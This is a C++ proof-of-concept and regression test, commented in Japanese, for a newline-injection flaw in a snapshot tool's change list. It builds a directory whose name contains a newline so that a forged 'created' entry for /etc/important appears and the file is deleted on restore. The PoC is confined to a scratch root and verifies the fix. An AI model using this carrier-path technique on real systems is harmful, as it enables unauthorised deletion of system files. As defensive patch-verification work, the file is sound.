/**
 * @file poc_change_record_injection.cpp
 * @brief 行指向の変更一覧出力への改行注入PoC (carrierディレクトリによるパス偽装)
 *
 * 攻撃の前提:
 *   パス構成要素に '/' は含められないため、「改行入りの名前」は改行入りのディレクトリとその配下の通常階層として作る
 *   例: /<scratch>/home/alice/<"carrier\n+.... " という名前のディレクトリ>/etc/important
 *   このフルパスをサーバが無検証で連結すると、
 *       +.... /<scratch>/home/alice/carrier
 *       +.... /etc/important
 *   の2行に割れ、2行目が独立した偽のcreatedエントリとして解釈される
 *
 * 本PoCが実コードで通すもの:
 *   - qsnapper::security::isRecordSafeText()    (サーバ側シリアライズのfail-closed)
 *   - FileChangeModel::setupModelData()         (クライアント側の行分割とツリー構築)
 *   - qsnapper::security::isConfirmedAbsentAt() (created削除前の復元元存在確認)
 *   - qsnapper::security::safeRemoveAllBeneathRoot() (実際の削除)
 *
 * 安全性:
 *   すべての操作は引数で与えられたscratch root配下に閉じる
 *   削除実行のbeneath-root引数にもscratch rootを渡すため、本番の "/" には一切触れない
 *   起動は"poc_change_record_injection.sh"経由で、user namespace内に隔離して行う
 *
 * 使い方:
 *   poc_change_record_injection <scratch-root> [--baseline]
 *     --baseline: サーバ側のfail-closedガードを適用せずに連結する (修正前の再現)
 *
 * 終了コード:
 *   0 = 期待どおり (baselineなら再現成功、fixedなら阻止成功)
 *   1 = 想定外 (baselineで再現失敗、fixedで再現成功)
 *   2 = 環境エラー
 */

#include <QCoreApplication>
#include <QDebug>
#include <QDir>
#include <QFile>
#include <QModelIndex>
#include <QString>
#include <QStringList>
#include <QTextStream>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include "filechangemodel.h"
#include "filesystemhelpers.h"
#include "inputvalidator.h"

namespace {

    constexpr int kExitExpected = 0;
    constexpr int kExitUnexpected = 1;
    constexpr int kExitEnvironment = 2;

    /**
     * @brief protectedなsetupModelData()をPoCから呼び出すための派生クラス
     */
    class PocFileChangeModel : public FileChangeModel
    {
    public:
        using FileChangeModel::setupModelData;
    };

    QTextStream &out()
    {
        static QTextStream stream(stdout);
        return stream;
    }

    void logLine(const QString &message)
    {
        out() << message << Qt::endl;
    }

    /**
     * @brief モデルのツリーを再帰走査して、指定パスのcreatedエントリを探す
     *
     * クライアントに偽エントリが「出現したか」を公開APIだけで判定する
     */
    bool findCreatedEntry(const FileChangeModel &model, const QModelIndex &parent,
                          const QString &targetPath)
    {
        const int rows = model.rowCount(parent);
        for (int row = 0; row < rows; ++row) {
            const QModelIndex index = model.index(row, 0, parent);
            QString path = model.data(index, FileChangeModel::PathRole).toString();
            while (path.size() > 1 && path.endsWith(QLatin1Char('/'))) {
                path.chop(1);
            }

            const int changeType = model.data(index, FileChangeModel::ChangeTypeRole).toInt();
            if (path == targetPath && changeType == static_cast<int>(FileChangeItem::Created)) {
                return true;
            }
            if (findCreatedEntry(model, index, targetPath)) {
                return true;
            }
        }
        return false;
    }

    /**
     * @brief 攻撃者が作るcarrierを実ファイルシステム上に構築する
     *
     * ディレクトリ名に改行と末尾スペースを含める。いずれもLinuxのファイル名として正当であり、非特権ユーザが自分の書込可能領域に作成できる
     *
     * @param scratchRoot 全操作を閉じ込めるscratch root (絶対パス)
     * @param carrierFullPath 構築したcarrierのフルパスの格納先
     * @return 構築できた場合はtrue
     */
    bool buildCarrier(const QString &scratchRoot, QString *carrierFullPath)
    {
        const QString carrierDirectoryName = QStringLiteral("carrier\n+.... ");
        const QString carrierBase = scratchRoot + QStringLiteral("/home/alice/") + carrierDirectoryName;
        const QString carrierEtc = carrierBase + QStringLiteral("/etc");
        const QString carrierFile = carrierEtc + QStringLiteral("/important");

        if (!QDir().mkpath(carrierEtc)) {
            logLine(QStringLiteral("ERROR: failed to create carrier directory tree"));
            return false;
        }

        QFile file(carrierFile);
        if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            logLine(QStringLiteral("ERROR: failed to create carrier payload file"));
            return false;
        }
        file.write("carrier payload\n");
        file.close();

        *carrierFullPath = carrierFile;
        return true;
    }

    /**
     * @brief サーバ側の変更一覧シリアライズを再現する
     *
     * 連結そのものは"snapshotoperations.cpp"と同じ形にし、ガードの有無だけを切り替える
     *
     * @param paths 比較結果として列挙されたフルパス
     * @param applyGuard trueならisRecordSafeText()によるfail-closedを適用する
     * @param output 生成した行指向テキストの格納先
     * @return fail-closedで拒否した場合はfalse
     */
    bool serializeFileChanges(const QStringList &paths, bool applyGuard, QString *output)
    {
        QString serialized;
        for (const QString &path : paths) {
            if (applyGuard && !qsnapper::security::isRecordSafeText(path)) {
                return false;
            }
            serialized += QStringLiteral("+....") + QStringLiteral(" ") + path
                          + QStringLiteral("\n");
        }
        *output = serialized;
        return true;
    }

    /**
     * @brief created削除の実行段ガードを実コードで確認する
     *
     * applyRestoreEntry()のcreated分岐と同じ順序で、復元元snapshotの不在確認を行ってから削除する
     * beneath-root引数にはscratch rootを渡すため本番の "/" には触れない
     *
     * @param scratchRoot 削除を閉じ込めるroot
     * @param sourceSnapshotDir 復元元snapshotに見立てたディレクトリ
     * @param entryPath 削除対象 (scratchRootを基準にした "/etc/important" 形式の表現)
     * @param relativePath sourceSnapshotDirからの相対パス
     * @param applyGuard falseなら修正前と同じく無検証で削除する
     * @param removed 実際に削除を実行したかの格納先
     * @return ガードが削除を許可した場合はtrue
     */
    bool applyCreatedEntry(const QString &scratchRoot, const QString &sourceSnapshotDir,
                           const QString &entryPath, const QString &relativePath,
                           bool applyGuard, bool *removed)
    {
        *removed = false;

        if (applyGuard) {
            const int sourceDirFd = ::open(sourceSnapshotDir.toUtf8().constData(),
                                           O_RDONLY | O_DIRECTORY | O_CLOEXEC);
            if (sourceDirFd < 0) {
                logLine(QStringLiteral("ERROR: failed to pin the fake source snapshot dir"));
                return false;
            }

            const bool absent = qsnapper::security::isConfirmedAbsentAt(sourceDirFd, relativePath);
            ::close(sourceDirFd);

            if (!absent) {
                return false;
            }
        }

        // beneath-root APIは「rootPath配下の絶対パス」を要求する
        // 本番は root="/" なので entry.path をそのまま渡すが、PoCではscratch rootを前置して削除を隔離環境内に閉じ込める
        *removed = qsnapper::security::safeRemoveAllBeneathRoot(scratchRoot, scratchRoot + entryPath);
        return true;
    }

} // namespace

int main(int argc, char *argv[])
{
    QCoreApplication app(argc, argv);
    const QStringList args = app.arguments();

    if (args.size() < 2) {
        logLine(QStringLiteral("usage: poc_change_record_injection <scratch-root> [--baseline]"));
        return kExitEnvironment;
    }

    const QString scratchRoot = QDir(args.at(1)).absolutePath();
    const bool baseline = args.contains(QStringLiteral("--baseline"));
    const QString mode = baseline ? QStringLiteral("baseline") : QStringLiteral("fixed");

    if (scratchRoot == QStringLiteral("/") || !scratchRoot.startsWith(QLatin1Char('/'))) {
        logLine(QStringLiteral("ERROR: refusing to run against the real root filesystem"));
        return kExitEnvironment;
    }
    if (!QDir(scratchRoot).exists()) {
        logLine(QStringLiteral("ERROR: scratch root does not exist: %1").arg(scratchRoot));
        return kExitEnvironment;
    }

    logLine(QStringLiteral("MODE        : %1").arg(mode));
    logLine(QStringLiteral("SCRATCH ROOT: %1").arg(scratchRoot));

    // --- Stage 1: 攻撃者がcarrierを作る ---
    QString carrierFullPath;
    if (!buildCarrier(scratchRoot, &carrierFullPath)) {
        return kExitEnvironment;
    }
    logLine(QStringLiteral("STAGE 1     : carrier created (%1 bytes in path, %2 newline(s))")
                .arg(carrierFullPath.size())
                .arg(carrierFullPath.count(QLatin1Char('\n'))));

    // --- Stage 2: サーバが変更一覧をシリアライズする ---
    const QStringList comparisonPaths = {
        scratchRoot + QStringLiteral("/home/alice"),
        carrierFullPath,
    };

    QString changeOutput;
    const bool serialized = serializeFileChanges(comparisonPaths, !baseline, &changeOutput);
    if (!serialized) {
        logLine(QStringLiteral("STAGE 2     : server refused to serialize (fail-closed)"));
    }
    else {
        const QStringList records = changeOutput.split(QLatin1Char('\n'), Qt::SkipEmptyParts);
        logLine(QStringLiteral("STAGE 2     : serialized %1 path(s) into %2 record(s)")
                    .arg(comparisonPaths.size())
                    .arg(records.size()));
        for (const QString &record : records) {
            logLine(QStringLiteral("              | %1").arg(record));
        }
    }

    // --- Stage 3: クライアントが行分割してツリーを構築する ---
    bool forgedEntryVisible = false;
    if (serialized) {
        PocFileChangeModel model;
        model.setupModelData(changeOutput, /*flatMode=*/false);
        forgedEntryVisible = findCreatedEntry(model, QModelIndex(), QStringLiteral("/etc/important"));
    }
    logLine(QStringLiteral("STAGE 3     : forged created entry /etc/important visible to client = %1")
                .arg(forgedEntryVisible ? QStringLiteral("YES") : QStringLiteral("no")));

    // --- Stage 4: 実行段ガード (復元元に存在するcreatedは削除しない) ---
    const QString sourceSnapshotDir = scratchRoot + QStringLiteral("/fake-snapshot");
    if (!QDir().mkpath(sourceSnapshotDir + QStringLiteral("/etc"))
            || !QDir().mkpath(scratchRoot + QStringLiteral("/etc"))) {
        logLine(QStringLiteral("ERROR: failed to prepare the victim fixture"));
        return kExitEnvironment;
    }

    // 復元元snapshotとlive側の双方にvictimを置く
    // unguarded用のコピーは、ガードを外すと実際に削除されることを示すための対照である
    const QStringList victimFixtures = {
        sourceSnapshotDir + QStringLiteral("/etc/important"),
        sourceSnapshotDir + QStringLiteral("/etc/important-unguarded"),
        scratchRoot + QStringLiteral("/etc/important"),
        scratchRoot + QStringLiteral("/etc/important-unguarded"),
        scratchRoot + QStringLiteral("/etc/created-after-snapshot"),
    };
    for (const QString &path : victimFixtures) {
        QFile file(path);
        if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            logLine(QStringLiteral("ERROR: failed to write fixture: %1").arg(path));
            return kExitEnvironment;
        }
        file.write("fixture\n");
    }

    // 4a: 修正前と同じ無検証の削除。偽エントリがそのまま破壊に繋がることを示す
    bool unguardedRemoved = false;
    applyCreatedEntry(scratchRoot, sourceSnapshotDir,
                      QStringLiteral("/etc/important-unguarded"),
                      QStringLiteral("etc/important-unguarded"),
                      /*applyGuard=*/false, &unguardedRemoved);
    const bool unguardedVictimSurvives =
        QFile::exists(scratchRoot + QStringLiteral("/etc/important-unguarded"));
    logLine(QStringLiteral("STAGE 4a    : without the guard, victim removed = %1, survives = %2")
                .arg(unguardedRemoved ? QStringLiteral("YES") : QStringLiteral("no"))
                .arg(unguardedVictimSurvives ? QStringLiteral("YES") : QStringLiteral("no")));

    // 4b: 追加層 (復元元存在確認) 適用時
    // 復元元に存在するため削除を拒否する
    bool victimRemoved = false;
    const bool guardAllowedDeletion =
        applyCreatedEntry(scratchRoot, sourceSnapshotDir,
                          QStringLiteral("/etc/important"), QStringLiteral("etc/important"),
                          /*applyGuard=*/true, &victimRemoved);
    const bool victimSurvives = QFile::exists(scratchRoot + QStringLiteral("/etc/important"));
    logLine(QStringLiteral("STAGE 4b    : with the guard, deletion allowed = %1, victim survives = %2")
                .arg(guardAllowedDeletion ? QStringLiteral("YES") : QStringLiteral("no"))
                .arg(victimSurvives ? QStringLiteral("YES") : QStringLiteral("no")));

    // 4c: 復元元に存在しない正当なcreatedは従来どおり削除されること (過剰拒否をしない)
    bool legitimateRemoved = false;
    const bool legitimateAllowed =
        applyCreatedEntry(scratchRoot, sourceSnapshotDir,
                          QStringLiteral("/etc/created-after-snapshot"),
                          QStringLiteral("etc/created-after-snapshot"),
                          /*applyGuard=*/true, &legitimateRemoved);
    logLine(QStringLiteral("STAGE 4c    : legitimate created deletion allowed = %1, removed = %2")
                .arg(legitimateAllowed ? QStringLiteral("YES") : QStringLiteral("no"))
                .arg(legitimateRemoved ? QStringLiteral("YES") : QStringLiteral("no")));

    // --- 判定 ---
    if (!unguardedRemoved || unguardedVictimSurvives) {
        logLine(QStringLiteral("RESULT      : FAIL (the deletion primitive did not work; the guard check would be vacuous)"));
        return kExitUnexpected;
    }
    if (!legitimateAllowed || !legitimateRemoved) {
        logLine(QStringLiteral("RESULT      : FAIL (over-rejection: a legitimate created entry was not removed)"));
        return kExitUnexpected;
    }
    if (guardAllowedDeletion || !victimSurvives) {
        logLine(QStringLiteral("RESULT      : FAIL (execution guard did not protect a path present in the restore source)"));
        return kExitUnexpected;
    }

    if (baseline) {
        if (forgedEntryVisible) {
            logLine(QStringLiteral("RESULT      : PASS (mode=baseline, outcome=reproduced)"));
            return kExitExpected;
        }
        logLine(QStringLiteral("RESULT      : FAIL (mode=baseline, outcome=not reproduced)"));
        return kExitUnexpected;
    }

    if (!serialized && !forgedEntryVisible) {
        logLine(QStringLiteral("RESULT      : PASS (mode=fixed, outcome=blocked)"));
        return kExitExpected;
    }
    logLine(QStringLiteral("RESULT      : FAIL (mode=fixed, outcome=reproduced)"));
    return kExitUnexpected;
}
